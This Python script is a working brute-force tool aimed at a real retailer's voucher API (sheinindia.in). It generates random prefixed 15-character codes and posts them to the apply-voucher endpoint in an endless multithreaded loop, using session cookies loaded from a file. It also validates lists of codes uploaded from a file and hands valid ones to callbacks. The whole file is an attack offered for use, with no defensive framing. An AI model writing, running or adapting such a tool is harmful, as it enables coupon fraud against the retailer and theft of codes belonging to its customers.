import json
import requests
import time
import threading
import random
import string
import os
from concurrent.futures import ThreadPoolExecutor
from requests.adapters import HTTPAdapter

APPLY_URL = "https://www.sheinindia.in/api/cart/apply-voucher"
RESET_URL = "https://www.sheinindia.in/api/cart/reset-voucher"

_thread_local = threading.local()
WORKERS = 3
PREFIXES = ["SVD", "SVH", "SVI", "SVC"]
RANDOM_LENGTH = 12  # 3 + 12 = 15
CHECK_DELAY = 2

# ========== COOKIE LOADING ==========
def load_cookies():
    try:
        with open("cookies.json", "r", encoding="utf-8") as f:
            raw = f.read().strip()
        try:
            cookie_dict = json.loads(raw)
            return "; ".join(f"{k}={v}" for k, v in cookie_dict.items())
        except:
            return raw
    except FileNotFoundError:
        print("❌ cookies.json not found!")
        return ""
    except Exception as e:
        print(f"❌ Error loading cookies: {e}")
        return ""

# ========== HEADERS ==========
def get_headers(cookie_string):
    return {
        "accept": "application/json",
        "accept-language": "en-US,en;q=0.9",
        "content-type": "application/json",
        "origin": "https://www.sheinindia.in",
        "referer": "https://www.sheinindia.in/cart",
        "user-agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36",
        "x-tenant-id": "SHEIN",
        "cookie": cookie_string
    }

# ========== SESSION ==========
def make_session():
    s = requests.Session()
    s.mount("https://", HTTPAdapter(pool_connections=100, pool_maxsize=100))
    return s

def get_session():
    if not hasattr(_thread_local, "session"):
        cookie_string = load_cookies()
        headers = get_headers(cookie_string)
        _thread_local.session = make_session()
        _thread_local.session.headers.update(headers)
        print("✅ Session ready")
    return _thread_local.session

# ========== VOUCHER CHECK ==========
def check_voucher(code):
    session = get_session()
    payload = {"voucherId": code, "device": {"client_type": "web"}}
    
    try:
        r = session.post(APPLY_URL, json=payload, timeout=10)
        if r.status_code == 200:
            try:
                data = r.json()
                if "errorMessage" in data:
                    return False
                return True
            except:
                return False
        return False
    except Exception as e:
        print(f"⚠️ Check error: {e}")
        return False

# ========== GENERATE 15-CHAR VOUCHER ==========
def generate_voucher():
    prefix = random.choice(PREFIXES)
    random_part = ''.join(random.choices(string.ascii_uppercase + string.digits, k=RANDOM_LENGTH))
    return prefix + random_part  # 3 + 12 = 15 chars

# ========== AUTO CHECK LOOP ==========
def auto_check_loop(valid_callback, update_counter):
    while True:
        code = generate_voucher()
        update_counter()  # total_checked++
        
        if check_voucher(code):
            valid_callback(code)
        
        time.sleep(CHECK_DELAY)

# ========== START AUTO CHECK ==========
def start_auto_check(valid_callback, update_counter):
    with ThreadPoolExecutor(max_workers=WORKERS) as executor:
        futures = [executor.submit(auto_check_loop, valid_callback, update_counter) for _ in range(WORKERS)]
        for future in futures:
            future.result()  # runs forever

# ========== FILE UPLOAD MODE ==========
def process_vouchers(vouchers, progress_callback, valid_callback, user_id):
    print(f"\n📂 Processing {len(vouchers)} vouchers from file...\n")
    
    get_session()
    valid = []
    total = len(vouchers)
    
    for i, code in enumerate(vouchers, 1):
        ok = check_voucher(code)
        mark = "✓" if ok else "✗"
        print(f"{i}/{total} [{mark}] {code}")
        
        if ok:
            valid.append(code)
            valid_callback(code)
        
        progress_callback(i, total, len(valid))
        
        if i < total:
            time.sleep(1)
    
    print(f"\n✅ Done. Valid: {len(valid)}")
    return valid
